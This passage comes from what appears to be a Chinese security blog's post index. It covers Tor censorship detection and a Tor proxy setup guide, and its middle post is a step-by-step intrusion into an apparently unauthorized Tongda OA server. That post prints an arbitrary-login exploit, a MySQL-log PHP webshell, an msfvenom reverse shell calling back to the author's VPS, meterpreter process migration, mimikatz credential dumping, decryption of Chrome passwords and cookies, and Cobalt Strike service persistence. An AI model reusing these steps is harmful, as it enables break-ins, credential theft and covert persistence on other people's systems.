同时他还承诺将会再透露至少三个关于Tor的0day漏洞，其中一个可以显示Tor服务器的真实IP地址。当然了，这也是后话，本文着重讨论其已经披露两个安全问题。 ## 漏洞摘要信息### 直接连接检测阻止Neal Krawetz在其博客上发表的一篇文章（https://www.hackerfactor.com/blog/index.php?/archives/888-Tor-0day-Stopping-Tor-Connections.html）披露了第一个安全问题。 这篇文章开头吐槽了其给一些公司报告漏洞，公司的响应不及时、不周到以及表现出敷衍的态度。 随后便开始吐槽起Tor Project了。几年前的一个关于Tor浏览器滚动条宽度会被攻击者识别底层操作系统的安全问题。 之后他谈论到了正题，第一个安全问题的详细技术信息。 简而言之，公司、服务提供商以及国家政府可以通过扫描网络连接，以查找Tor流量的**独特数据包签名（distinct packet signature）**来阻止用户连接到Tor网络。从而使用户无法绕过网络审查。 ### 间接连接检查阻止间接连接，也就是一些被网络封锁审查的地区中用户无法直连Tor网络。他们得需要通过Tor网桥（bridges）才能连接到Tor网络入口节点进行匿名化。 Tor网桥，即可插拔传输器（Pluggable Transports）有好几种： obfs4 obfs4 使 Tor 的流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 与之前的 obfs3 网桥相比，obfs4 网桥被阻塞的可能性较小。 meek meek 依赖的这几个云计算平台都是大公司（亚马逊、微软）提供的，使您看起来像在浏览主要网站，而不是使用 Tor。 meek-azure 使您看起来像在使用 Microsoft 网站。 snowflake Snowflake 是对 Flashproxy 的改进。 它通过WebRTC发送您的流量，WebRTC 是一种具有内置网络地址转换穿透的对等（P2P）协议。 而根据其发表的第二篇博文（https://www.hackerfactor.com/blog/index.php?/archives/889-Tor-0day-Burning-Bridges.html）介绍了识别Tor网桥流量的方法，包括两个0day漏洞。一个是针对obfs4的，另一个是针对meek网桥的。 具体技术细节可以详见此博文…… 如若网桥流量如果被真正地检测出来了，那么也就表明通过网桥连接到Tor匿名网络的人将会受到直接监视（监视者知道位于这个公网IP地址的人正在尝试使用Tor网桥来连接至Tor网络进行匿名化）。 ## 争议性在Neal Krawetz发表博文之后，Tor Project没有通过私人渠道答复Krawetz，而是通过推特公开回应了他的那两篇博文。 NEW: People have asked us about a series of bugs that are being publicized and incorrectly labeled as 0-days. Whenever we are notified of high-risk security bugs, we will, as always, address these issues and release formal responses so you know what’s happening. @torprojecttwitter.com/torproject/status/1288955073322602496 Tor Project表明，他们知道Neal Krawetz报告的安全问题。上周的两个报告（也就是第一篇博文）并不是什么新鲜事物，而后一篇博文中谈论的两个所谓的0day漏洞值得探讨，但几乎没有证据表明它们可以大规模地工作。并且Tor Project不同意Krawetz博文中关于对漏洞作为0day的称呼。 两日后（2 August 2020），Krawetz也对Tor Project发表的声明进行来辩论： https://www.hackerfactor.com/blog/index.php?/archives/890-Tor-0day-Replying-to-the-Tor-Project.html …… ## 天朝会有影响吗？答案当然是：没有。 在我近期少有的几次尝试中发现，在天朝GFW的干扰下，不光是无法直接连接到Tor网络，而且也无法直接连接到网桥至Tor网络。 也就是说天朝用户无法直连Tor网络，也无法通过网桥连接上Tor网络。 这个地方的现象证实了Tor Project不认同那两个漏洞作为0day称呼的说法。那位博士所述的那些关于Tor网络以及网桥流量可被检测的“0day漏洞”在这里、在GFW结合使用主动扫描、深度数据包检测之下早已经成了「既定事实」，哪里称得上是0day未知漏洞。 或许在此前（一年前）可以通过obfs4或者meek连接上。但是目前不行，当然或许也只是我没测试成功。 但其实我更想说的是，无法直连或者无法直接通过网桥来连上Tor网络未必是坏事情。 一般来说，都是在Tor流量或网桥流量前套一层shadowsocks的前置代理流量。对Tor和网桥流量再进行一层流量加密。使得网络流量更加具有保密性（Confidenciality）。 当然了，shadowsocks也会存在问题。 例如“协议可以被识别？”（威胁建模，假定认同）。不过被识别也只是会被监视者认为是普通翻墙流量。 虽说可以被识别，但还是依然认为其加密是靠谱的，至少中间人解不出明文信息。然而，前几个月（ 2020年02月28日）shadowsocks被披露出「steam加密存在漏洞，导致数据包头部可被修改」。攻击者可利用修改过后的数据包进行「重定向」，从而进行中间人攻击。 虽说shadowsocks也会有很大的问题，但是就目前而言。此方案（Tor over Shadowsocks，即在Tor网桥流量前套一层shadowsocks的前置代理流量）仍然足够靠谱！","categories":[],"tags":[{"name":"tor","slug":"tor","permalink":"https://fanqxu.github.io/tags/tor/"}]},{"title":"从任意登录RCE到入门Cobalt Strike后渗透","slug":"Arblogin-RCE-PostPen","date":"2020-05-09T09:21:11.000Z","updated":"2020-06-03T12:08:34.000Z","comments":true,"path":"2020/05/09/Arblogin-RCE-PostPen/","link":"","permalink":"https://fanqxu.github.io/2020/05/09/Arblogin-RCE-PostPen/","excerpt":"","text":"一次真实的渗透测试，主要是打算漏洞复现通达OA的这个洞。然后随便入门学习了后渗透神器CS的使用。 0x00 通达OA任意登录前段时间通达OA曝出前台任意用户登录，两个版本会受到影响。 漏洞复现服务端只取了整型递增UID来做用户身份鉴别，从而可登录指定UID的用户（包括管理员admin用户）。 v2017 POST/logincheck.php，并增加一个可控的参数UID。响应包中会有UID为1的admin用户的PHPSESSID。 class=\"lazyload\" data-src=\"https://i.loli.net/2020/05/09/bPmOCMgtoczT1e8.png\" 使用此PHPSESSID直接请求/general/index.php就可以登录admin用户了。 class=\"lazyload\" data-src=\"https://i.loli.net/2020/05/09/NlrgFfsOPbSWExa.png\" v11.4 GET请求/general/login_code.php，响应包会返回一个CODEUID。 POST请求/logincheck_code.php，带上刚刚返回的CODEUID参数（CODEUID是为了绕过if条件的exit()）并增加一个可控的参数UID，赋值变量UID为1，从而控制该SQL语句返回的结果为USER表中UID为1的用户信息（默认UID为1的用户是管理员admin）；发送数据包，响应包头会返回admin用户的PHPSESSID。 使用此PHPSESSID就可以登录admin用户了。 class=\"lazyload\" data-src=\"https://i.loli.net/2020/05/09/98bDhXTHsrENGuI.png\" 0x01 远程代码执行由前边的任意登录，进去后可以得知web根目录。 登录了后台管理权限以及知道了根目录绝对路径就可以利用MySQL日志进一步写shell了。直接用脚本来写shell后门。 EXP来源于zrools：https://github.com/zrools/tools 脚本上传webshell代码： 以上base64解密后如下，即通过MySQL日志写shell： set global general_log=&#39;on&#39;; set global general_log_file=&#39;MYOA_WEBSHELL&#39;; select &quot;&lt;?php $command=$_GET[&#39;cmd&#39;];$wsh = new COM(&#39;WScript.shell&#39;);$exec = $wsh-&gt;exec(&#39;cmd /c &#39;.$command); $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt;&quot;; set global general_log=&#39;off&#39;; 执行脚本会得到一个shell，直接是system权限。 # python3 tongda_v11.4_rce_exp.py webroot: D:\\\\MYOA\\\\webroot cookies: PHPSESSID=sdtpt1h45no9th2lt7d1j0vtl5 webshell: (GET) http://*.*.*.*:8008/api/test.php?cmd=ipconfig 不过，此方式是接收GET参数的webshell，不太方便后续渗透。 所以可以简单修改成一个接收POST参数的马，然后连接菜刀或者蚁剑。 执行命令还是SYSTEM权限，未开启disable_functions。 0x02 后渗透测试Metasploit反弹Meterpreter生成木马（LHOST为我的VPS公网地址）： # msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=4444 -f exe -o shell.exe 在VPS上可以使用screen会话恢复工具： # screen -S MSF MSF侦听： # msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 172.16.123.89; exploit -j&quot; [*] Exploit running as background job 1. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 172.16.123.89:4444 将之前生成的MSF木马通过蚁剑上传只服务器，然后在Terminal中执行。VPS MSF这儿就会就收到一个meterpreter sessions。 msf5 exploit(multi/handler) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ WIN 172.16.123.89:4444 -&gt; *.*.*.*:31308 (*.*.*.*) msf5 exploit(multi/handler) &gt; sessions 1 [*] Starting interaction with 1... meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 仍然是SYSTEM权限！所以目前就不需要提权了。 进程迁移将当前meterpreter进程绑定到系统上的其他常见进程，让管理员更难以发现。 meterpreter &gt; getpid Current pid: 4652 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 160 528 svchost.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\svchost.exe 180 528 svchost.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\svchost.exe 272 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 368 360 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 384 528 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 412 360 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe ……………… meterpreter &gt; migratepid meterpreter &gt; migrate 412 [*] Migrating from 4652 to 412... [*] Migrating completed successfully. 明文密码获取dump各个用户的hashes密码，并加载mimikatz模块。 获取登录过的用户储存在内存里的明文密码。 后门原本打算使用MSF中的metsvc和persistence脚本，但是并不太稳定。 所以尝试添加一个后门用户。 激活Guest用户 创建隐藏用户 影子账户 所以先尝试激活Guest用户，但是让我没想到滴是，已经有人捷足先登了？ 他已经激活了。并且密码设置的很简单，被我猜测出来了。 C:\\&gt; net user guest 用户名 Guest 全名 注释 供来宾访问计算机或访问域的内置帐户 用户的注释 国家/地区代码 000 (系统默认值) 帐户启用 Yes 帐户到期 从不 上次设置密码 2020/5/8 11:27:55 密码到期 从不 密码可更改 2020/5/8 11:27:55 需要密码 No 用户可以更改密码 No 允许的工作站 All 登录脚本 用户配置文件 主目录 上次登录 2020/5/8 11:27:59 可允许的登录小时数 All 本地组成员 *Administrators *Guests 全局组成员 *None 命令成功完成。 所以就索性登录进去了，通过桌面上的文件，发现他在尝试进行提权。然后打开了浏览器历史，发现都是他使用百度搜索提权相关文章。。。（一看水平就不咋滴！这是台境外主机，是可以直连Google的） 通过下线时间来看，他弄到了凌晨4、5点钟。 凭证获取前面通过MSF加载了mimikatz。而现在直接通过蚁剑上传一个mimikatz。然后使用CMD运行。 开启日志记录和Debug功能： .#####. mimikatz 2.2.0 (x64) #18362 May 2 2020 16:23:51 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # log Using &#39;mimikatz.log&#39; for logfile : OK mimikatz(commandline) # privilege::debug Privilege &#39;20&#39; OK 列出所有可用的提供者的凭据： mimikatz(commandline) # sekurlsa::logonpasswords 列出 LM 和 NTLM 凭证数据 mimikatz(commandline) # sekurlsa::msv 列出已缓存的主密钥（Masterkey）： mimikatz(commandline) # sekurlsa::dpapi 使用获取到的Masterkey来解密浏览器保存的密码： mimikatz # dpapi::chrome /in:&quot;C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data&quot; /masterkey:796544192e821da616c9409fce49c056c9fdadb40 不过只解了一个网站的密码，但也算幸运滴！ 让人意外的是这网站还是个VPS托管商，真是意外收获： class=\"lazyload\" data-src=\"https://i.loli.net/2020/05/09/pzv3dJxHweE2afC.png\" 还可以解Cookie： mimikatz # dpapi::chrome /in:&quot;C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies&quot; /masterkey:796544192e821da616c9409fce49c056c9fdadb40 CobaltStrikeCobaltStrike已经成为后渗透、权限维持和内网渗透中，少不了的利器。 会话连接 在VPS上装好Java环境后，才可以启动团队服务： root@localhost:~/CobaltStrike4.0# ./teamserver *.*.*.* password 然后客户端连接TeamServer，先创建一个Listeners。HTTP HOST地址都是TeamServer的公网IP。 再然后生成一个Windows木马，默认名为artifact.exe。 通过蚁剑传到服务器，并通过蚁剑Terminal执行此文件，CS客户端就会收到一个会话。 权限维持通过Service的方式。 生成一个服务的可执行文件，并upload至服务器。 通过CS beacon创建一个服务，指向此后门。并设为开机自启，启动服务。 beacon&gt; shell sc create &quot;CyberSecServer&quot; binpath= &quot;C:\\Windows\\System32\\s3rv1ce.exe&quot; beacon&gt; shell sc description &quot;CyberSecServer&quot; &quot;Security Service&quot; beacon&gt; shell sc config &quot;CyberSecServer&quot; start= auto beacon&gt; shell net start &quot;CyberSecServer&quot; start后就会立马弹回一个会话，权限都是SYSTEM。并且开机自启动。 权限维持的方式有多种，通过NC、Powershell开机自启动，或者创建服务自启动与注册表设置开机启动项等。 但无论哪种，最重要的就是免杀。 Reference通达OA匿名RCE ExP Unofficial Guide to Mimikatz &amp; Command Reference","categories":[],"tags":[{"name":"后渗透","slug":"后渗透","permalink":"https://fanqxu.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"}]},{"title":"优雅的使用 Tor 兼浅谈安全原理","slug":"Easier-use-of-Tor-and-talkabout-security-principles","date":"2020-03-15T11:02:57.000Z","updated":"2020-11-12T13:26:09.000Z","comments":true,"path":"2020/03/15/Easier-use-of-Tor-and-talkabout-security-principles/","link":"","permalink":"https://fanqxu.github.io/2020/03/15/Easier-use-of-Tor-and-talkabout-security-principles/","excerpt":"使用 Tor 并不能完全地匿名，或者说只能在网络层面最大限度的匿名。 要想完全地匿名，仅仅只是网络层面当然是远远不够滴！ 至少包括但不限于以下几个层面： 硬件层面 系统层面 软件层面 网络层面 社会工程学层面","text":"使用 Tor 并不能完全地匿名，或者说只能在网络层面最大限度的匿名。 要想完全地匿名，仅仅只是网络层面当然是远远不够滴！ 至少包括但不限于以下几个层面： 硬件层面 系统层面 软件层面 网络层面 社会工程学层面 而本文就网络层面，即平常上网的公网 IP 层面来探讨。 本文所要说的 Tor 是指 Tor Proxy，而非 Tor Browser；抛弃 Tor Browser 浏览器，如何更优雅地使用 Tor 的匿名网络代理？ 当然使用其他浏览器可能会更危险，但是此文的重点是如何更简捷地使用 Tor 的那三重匿名代理以及浅谈 Tor 的工作原理；而非拿 Tor 的代理来浏览网页！ 0x00 澄清一点许多人认为，Tor 的出现助长了网络犯罪者，各种暗网无约束地犯罪； 但是我认为这种想法是不全面滴！ 首先 Tor 被设计成通过防止被各种人/组织/Gov 监控和审查来抵御人权和隐私，使用 Tor，任何人，包括记者、人权活动家、外交官以及商务人士，都能够在使用互联网的时候，不再担心 Gov 与企业的监控。并且 Tor 官方厌恶用 Tor 做坏事的人。 其次这样想想，如果 Tor 消失掉！ 那些网络犯罪者/黑帽子是否会减少？我认为并不会，那些黑帽完全可能会变着花样继续做坏事，例如大肆入侵其他人/组织的PC/服务器来充作肉鸡/跳板机。这样一来，网络犯罪数量可能并不会减少。 相反地，那些真正需要使用 Tor 的人，例如人权活动者、记者、虐待后的幸存者们、专制政权统治下的民主人士以及其他用 Tor 做好事的人们，他们可没有入侵的本领，他们应该怎么办？ 0x01 Tor 匿名网络 再次强调：仅仅使用 Tor 并不能完全匿名！甚至说，在网络层面也不能完全匿名！ 首先是操作系统，Windows 绝对不可行，更不可信；macOS 貌似也可以。但是对于安全，当然首选 Linux 系统； 简介Tor 是实现匿名通信的自由软件。其名源于”The Onion Router”（洋葱路由器）的英语缩写。用户可透过 Tor 接达由全球志愿者免费提供，包含7000+个中继的覆盖网络，从而达至隐藏用户真实地址、避免网络监控及流量分析的目的。 即当您的流量通过 Tor 网络时，您的流量会被中继和加密三次。 该网络由数千个志愿者运行的服务器组成，称为 Tor 中继。(Tor 的流量网速非常慢，拿它来看视频是非常不道德滴！) 在流量抵达目的地前，Tor 通过三台/层不同中继(Relay)服务器来传递。三层中每一层都附加了互相独立的加密；而且默认每隔10分钟，三个节点就会变化一次，重新构造一条传输线路。 安装首先先是安装 Tor 服务了： $ sudo apt install tor 其他 Linux 发行版本各自换成自家的包管理器，另外不要装错包了，不是装 tor-browser 浏览器。 源码：https://gitweb.torproject.org/tor.git Github：https://github.com/torproject/tor 不过 GitHub这个仓库并不是 official 的。 基本配置Tor 的主要配置文件就是 /etc/tor/torrc，由此配置文件来启动 tor.service 服务 。下面我来说明这个配置文件应该如何配置： ControlPort通过 ControlPort 开放的9051端口，其他程序可以更改、监控和管理 Tor 节点、配置及服务，或者获取关于 Tor 网络状态和 Circuits 的状态。 ControlPort 9051 如果使用 Tor Browser，就没必要开启这个了。本来为了安全起见，这个也不应该被开启/设置滴！ 但是由于使用的是 Tor Service，而非 Tor Browser；所以需要一个前端界面来管理 Tor 服务，等会会用到一个程序 NYX，也是 Tor 官方开发的。 Tor CookieCookieAuthentication 1 CookieAuthFile /var/lib/tor/control_auth_cookie CookieAuthFileGroupReadable 1 DataDirectoryGroupReadable 1 使用 Cookie 认证，这个就是对 ControlPort 的访问将受到对 Tor Cookie 文件和数据目录的文件权限限制；并且设置了，在 Tor group 中的所以用户都可以访问 Tor Cookie 文件。 将当前用户添加到 Tor 组，并重新加载组设置： $ sudo usermod -a -G tor $USER $ newgrp tor 重启服务： $ sudo systemctl restart tor 测试访问 Cookie 文件： $ stat -c%a /var/lib/tor /var/lib/tor/control_auth_cookie 750 640 配置控制密码： $ sudo set +o history $ sudo tor --hash-password T0R 16:30BB592367F379ED60EE638DE436D43A5E99C582DE0D17CBB5003AC120 $ sudo set -o history 首先先取消所输命令的历史，然后我这里设置的密码是 T0R，回车就会返回一段 hash 密文。 然后将此 hash 添加到配置文件中： HashedControlPassword 16:30BB592367F379ED60EE638DE436D43A5E99C582DE0D17CBB5003AC120 ControlSocket某些程序可能需要访问 ControlSocket（例如 Unix Domain Socket）。 ControlSocket /var/lib/tor/control_socket ControlSocketsGroupWritable 1 DataDirectoryGroupReadable 1 CacheDirectoryGroupReadable 1 再次添加用户到 Tor 组（有的发行版本，例如 Kali Linux 是 debian-tor），并重载： $ sudo usermod -a -G tor $USER $ newgrp tor 再重启服务： $ sudo systemctl restart tor 验证 ControlSocket 状态，应该返回750和660： $ stat -c%a /var/lib/tor /var/lib/tor/control_socket 750 660 测试 Tor Control使用 nc 先测试 ControlPort： $ echo -e &#39;PROTOCOLINFO\\r\\n&#39; | nc 127.0.0.1 9051 250-PROTOCOLINFO 1 250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&quot;/var/lib/tor/control_auth_cookie&quot; 250-VERSION Tor=&quot;0.4.2.6&quot; 250 OK 514 Authentication required. 然后再使用 socat 测试 ControlSocket： $ echo -e &#39;PROTOCOLINFO\\r\\n&#39; | sudo -u $USER socat - UNIX-CLIENT:/var/lib/tor/control_socket 250-PROTOCOLINFO 1 250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&quot;/var/lib/tor/control_auth_cookie&quot; 250-VERSION Tor=&quot;0.4.2.6&quot; 250 OK 514 Authentication required. 进阶前置代理一般地都会在使用 Tor 时套一个前置代理，这样子做可以保护真正的公网 IP 不泄露给 Tor 的三个节点。 一般地就拿 shadowsocks 来举例，其代理协议和端口为 Socks5 和1080。 添加如下至 torrc 中： Socks5Proxy 127.0.0.1:1080 Pluggable Transports由于某些地区 ISP/Gov 会阻断直接 Tor 独立联网，所以 Tor 官方推出了一些方法。 即可插拔传输器，目前有三种： obfs4 obfs4 使 Tor 的流量看起来是随机的，并且还防止检查程序通过互联网扫描找到网桥。 与之前的 obfs3 网桥相比，obfs4 网桥被阻塞的可能性较小。 meek meek 依赖的这几个云计算平台都是大公司（亚马逊、微软）提供的，使您看起来像在浏览主要网站，而不是使用 Tor。 meek-azure 使您看起来像在使用 Microsoft 网站。 snowflake Snowflake 是对 Flashproxy 的改进。 它通过WebRTC发送您的流量，WebRTC 是一种具有内置网络地址转换穿透的对等（P2P）协议。 就拿 obfs4 来说（其他两种方式可以自行摸索）： 首先得先安装 obfs4 client： $ sudo apt install obfs4proxy 然后添加去 Tor BridgeDB 申请一个 Bridge； 并添加至配置文件中： UseBridges 1 ClientTransportPlugin obfs4 exec /bin/obfs4proxy Bridge obfs4 195.x.x.x:443 375C3E9451E93AF49DA654958EE2C348CDD0BC32 cert=mC7+A9QdsVrbU8t/wxTdoPYn4HXTeLMLR4cLqTvy78OSNfnJciIIaKlRdO43M8cdqFBmWw iat-mode=0 Bridge obfs4 93.x.x.x:443 C14FE02FD5612975658413657C7B2F18371D17F1 cert=Csjph7dmFxf1pnLX2V+42WH3WZkvIgSlWLBZuOOsukqusOClRg9esphbBy30J/4t2OjeIQ iat-mode=0 Bridge obfs4 185.2x.x4.x6:80 0C556DC0725775FE9C76C877A47009CFAAFDA688 cert=zG6an8OkE3tWuKrea5Q8Ju1suNiBbUuB/L2UeFt3iXRsn06IF3sdaD2M5fJKqJ7KdT7sGw iat-mode=0 不要复制上面的 Bridges，因为并不能用。 节点编辑一些危险的国家/地区(相对来说)，所提供的节点很可能是蜜罐。 ExcludeNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;kp&#125;,&#123;ir&#125;,&#123;sy&#125;,&#123;pk&#125;,&#123;cu&#125;,&#123;vn&#125;,&#123;ru&#125; ExcludeExitNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;sg&#125;,&#123;th&#125;,&#123;pk&#125;,&#123;by&#125;,&#123;ru&#125;,&#123;ir&#125;,&#123;vn&#125;,&#123;ph&#125;,&#123;my&#125;,&#123;cu&#125; StrictNodes 1 ExcludeNodes 即排除节点，把这些国家的节点从 Tor 链路上除掉；而 ExcludeExitNodes 是指排除出口节点，，即 Tor 的出口节点要排除括号中的几个国家的节点。StricNodes 是强制执行。 当然还可以指定出口节点： StrictExitNodes 1 ExitNodes &#123;us&#125; 但是其实是没必要的，视具体情况而定。 前端界面测试一切配置完毕后，就可以测试了！ $ sudo systemctl restart tor $ sudo systemctl enable tor $ sudo systemctl status tor ● tor.service - Anonymizing Overlay Network Loaded: loaded (/usr/lib/systemd/system/tor.service; enabled; vendor preset: disabled) Active: active (running) since Sun 2020-03-15 14:33:59 CST; 7s ago Main PID: 8723 (tor) Tasks: 12 (limit: 14213) Memory: 23.0M CGroup: /system.slice/tor.service ├─8723 /usr/bin/tor -f /etc/tor/torrc └─8728 /bin/obfs4proxy Mar 15 14:33:59 4rch Tor[8723]: Delaying directory fetches: Pluggable transport proxies still configuring Mar 15 14:34:00 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address. Will prefer &gt; Mar 15 14:34:01 4rch Tor[8723]: Bootstrapped 1% (conn_pt): Connecting to pluggable transport Mar 15 14:34:01 4rch Tor[8723]: Bootstrapped 2% (conn_done_pt): Connected to pluggable transport Mar 15 14:34:02 4rch Tor[8723]: Bootstrapped 10% (conn_done): Connected to a relay Mar 15 14:34:02 4rch Tor[8723]: Bootstrapped 14% (handshake): Handshaking with a relay Mar 15 14:34:03 4rch Tor[8723]: Bootstrapped 15% (handshake_done): Handshake with a relay done Mar 15 14:34:03 4rch Tor[8723]: Bootstrapped 75% (enough_dirinfo): Loaded enough directory info to build&gt; Mar 15 14:34:06 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address. Will prefer &gt; Mar 15 14:34:06 4rch Tor[8723]: Bootstrapped 95% (circuit_create): Establishing a Tor circuit Mar 15 14:34:07 4rch Tor[8723]: Bridge &#39;bitclcpriv5&#39; has both an IPv4 and an IPv6 address. Will prefer using its IPv4 address (195.135.……………… Mar 15 14:34:08 4rch Tor[8723]: Bootstrapped 100% (done): Done Bootstrapped 到 100%时就成功了！ 浏览器挂好代理就可以测试是否使用的是 Tor 网络，Tor 的代理类型是 Socks5，9050 端口。 测试网站：https://check.torproject.org NYX前面说了会使用一个 Tor 官方开发的程序来对 Tor 网络进行管理，即 Nyx。 很不错的一款软件，可以显示带宽、日志、连接路线，编辑配置文件，交互 shell 等等…… 官网：https://nyx.torproject.org $ sudo apt install nyx 输入命令即可运行(Tor 服务必须运行成功才能使用)，需要最开始设置的密码(T0R)。 如下是上下行带宽： $ nyx nyx - de (Linux 4.5.9-debian1-2) Tor 0.4.2.6 (recommended) Relaying Disabled, Control Port (password): 9051 cpu: 0.0% tor, 1.5% nyx mem: 37 MB (0.3%) pid: 8951 uptime: 17:45 page 1 / 5 - m: menu, p: pause, h: page help, q: quit Bandwidth (limit: 1 GB/s, burst: 1 GB/s): Download (0.0 B/sec - avg: 1.5 KB/sec, total: 1.5 MB): Upload (0.0 B/sec - avg: 409.1 B/sec, total: 425.9 KB): 1 KB 1 KB 700 B 714 B 350 B 357 B 0 B 0 B 10s 20 30 40 50 10s 20 30 40 50 第二页是路线(Guard 是人口节点，Middle 中间节点，End 出口节点)： page 2 / 5 - m: menu, p: pause, h: page help, q: quit Connections (6 circuit, 1 control): 104.44.95.162 --&gt; 1.89.2.2:9001 (us) Purpose: General, Circuit ID: 7 20.2m (CIRCUIT) │ 192.168.0.1:0 (??) 0C556DC0720875FE9C76C877A47899CFAAFDA688 UNKNOWN 1 / Guard │ 6.21.73.207:8008 (us) B872BA6804C8C4E141AE1497B44CF32B82FD2397 UNKNOWN 2 / Middle └─ 5.39.72.2:9001 (fr) 2FFE5FAF70D20E76B0474AE9E40C2A0B53F8D9F0 Unkn0wn 3 / End 104.44.95.162 --&gt; 3.12.64.185:443 (fr) Purpose: General, Circuit ID: 5 20.2m (CIRCUIT) │ 192.168.0.1:0 (??) 0C556DC0725775FE9C76C877A47009CFAAFDA688 UNKNOWN 1 / Guard │ 184.27.85.34:9001 (fr) 5B3EC887418596BBE9A291C2A845A4EFF8AB05B8 UNKNOWN 2 / Middle └─ 230.129.64.115:443 (ca) F4C836A27BF192F3464A67126E8EE2B19693AED1 UNKNOWN 3 / End 204.44.94.162 --&gt; 54.38.219.250:443 (fr) Purpose: General, Circuit ID: 6 20.2m (CIRCUIT) │ 192.168.0.1:0 (??) 0C556DC0725775FE9C76C877A47009CFAAFDA688 UNKNOWN 1 / Guard │ 61.21.83.27:8008 (fr) B872BA6124C8C6E450AE1897B44CF32B42FD2397 UNKNOWN 2 / Middle └─ 55.34.219.25:443 (fr) 929BB84A64318CE35E2F2828812840AF5C2CBC4A UNKNOWN 3 / End 204.44.94.162 --&gt; 116.202.112.170:443 (de) Purpose: General, Circuit ID: 10 9.0m (CIRCUIT) │ 192.168.0.1:0 (??) 0C556DC0725775FE9C76C877A47009CFAAFDA688 UNKNOWN 1 / Guard │ 56.38.134.34:443 (pl) 39C6F833D4B09524770D5675DF825A11293CA0A2 UNKNOWN 2 / Middle └─ 106.212.111.17:443 (de) 2A1353D8439453E9ED8F5C27F3459DFB01BF9523 UNKNOWN 3 / End 127.0.0.1:47554 (??) --&gt; 204.44.94.162:9051 nyx (14125) +41.9s (CONTROL) 等等…… 0x02 浅谈安全原理HTTP当我们平常上网时，上的网站/APP 如果都是 HTTP 明文传输类型的，我称这种情况为明文裸奔。 那么此时，我们上网的数据包路线就是由自个电脑/手机发出，经过路由器或者直接到运营商ISP，最后到网站/服务器。这种场景下，从用户 Client 端直到网站 Server 端之间传输的数据均是明文。此时黑客攻击者、运营商/Gov 可以通过链路劫持，以及网站工作人员直接能看到： 你的公网 IP 位置（通常真实的公网IP泄露也就代表真实地理位置暴露） 你所访问的网站 在此网站输入的账号密码 以及你浏览此网站的明文页面数据 HTTPS当我们上的网站/APP 是 HTTPS，这种情况下： 黑客攻击者、运营商/Gov 可以看到： 你的公网 IP 你所访问的网站 在此网站输入的账号密码 以及你浏览此网站的明文页面数据 虽然是现在都是加密存储用户名密码，但是也要保持谨慎；所以，网站工作人员最坏的情况可以看到你的： 你的公网 IP 你所访问的网站 在此网站输入的账号密码 以及你浏览此网站的明文页面数据 Tor当仅仅只是使用了 Tor 网络，而访问了 HTTP 的服务器。 而此时数据经过的路线即： 首先由自个电脑/手机 Client 端发出；经过路由器或者直接到运营商ISP； 然后再到 Tor 网络的第一入口中继节点，第一节点解除第一层加密，但无法获悉网页请求指向的网站； 转而到中间节点，解除第二层加密，啥也不知道，将网页请求转发至下一节点； 接着到出口节点，解除最后一层加密，并将网页请求转发给目标服务器，但是无法获悉该请求来自哪个 IP。 再然后到第二个运营商，最后到网站服务器。 先说经过 Tor 网络入口节点前，攻击者/ISP/Gov 可以知晓： 你的公网 IP 以及知道你发出了 Tor 流量 然后流量到第一入口节点，其可以看到你的： 公网 IP 你发出了 Tor 流量 你所访问的网站 在此网站输入的账号密码 以及你浏览此网站的明文页面数据 入口节点仅仅能看到你这个 IP 地址正在使用 Tor，但是它无法确定你的网络去向。 第二中间节点只能接收第一节点的 Tor 流量。 第三出口节点看不到你的公网 IP，但可以知晓： 你的公网 IP 来自中间节点的 Tor 流量 将要访问的网站 传输的明文账户密码 以及明文数据 之后到达 ISP和网站，此时出口节点后的 ISP/Gov/攻击者/网站工作人员可以窥探： 你的公网 IP 来自出口节点的 Tor 流量 将要访问的网站 传输的明文账户密码 以及访问的明文页面数据 不过仍然看不到你的公网 IP。 但是要考虑，这些节点可能为蜜罐以及公司、Gov、攻击者、搭建蜜罐节点的志愿者之间的合作，所以仍然是很危险的！ Tor + HTTPS很显然这种方案比上面的要安全一点，但是仍然不太安全。 此时的数据路线和使用上面仅使用 Tor 一样。 所以，到达 Tor 网络第一入口节点(包括入口节点)，攻击者/ISP/Gov/入口节点可以知晓： 你的公网 IP 以及知道你发出了 Tor 流量 第二中间节点只接收到来自第一入口节点的 Tor 流量。 出口节点及出口节点后的 ISP/Gov/攻击者可以知晓： 